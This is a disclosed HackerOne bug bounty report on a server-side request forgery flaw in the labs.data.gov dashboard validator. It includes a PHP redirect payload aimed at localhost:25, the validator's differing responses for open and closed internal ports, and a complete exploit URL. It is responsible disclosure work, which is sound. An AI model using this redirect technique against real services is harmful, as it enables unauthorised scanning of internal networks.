# SSRF/XSPA in labs.data.gov/dashboard/validate

## Report Details
- **Report ID**: 272095
- **URL**: https://hackerone.com/reports/272095
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-09-26T16:40:23.115Z
- **Disclosed**: 2020-05-05T20:18:01.922Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Hi.

This vulnerability allows access to all ports locally. Which is not visible from the web.

1)We need an interim site file index.php
2)Next we write in index.php

`<?
header("Location: http://localhost:25");
?>`

3)Next go to https://labs.data.gov/dashboard/validate

And write url - for example http://example/index.php

If the port will be open (locally) that we will see the inscription

`Source http://example/index.php
Schema federal-v1.1
Valid JSON false
Errors 
The validator was unable to determine if this was valid JSON`
F224225

if not open

`Source http://example/index.php
Schema non-federal
Errors 
File not found or couldn't be downloaded`
F224224

final url for example
`https://labs.data.gov/dashboard/validate?schema=federal-v1.1&output=browser&datajson_url=http%3A%2F%2Fexample%2Findex.php&qa=true&as_sfid=your_sfid&as_fid=your_fid`


thank you ,haxta4ok00

## Attachments
- false_port_258.png
- true_open_port_25_local.png
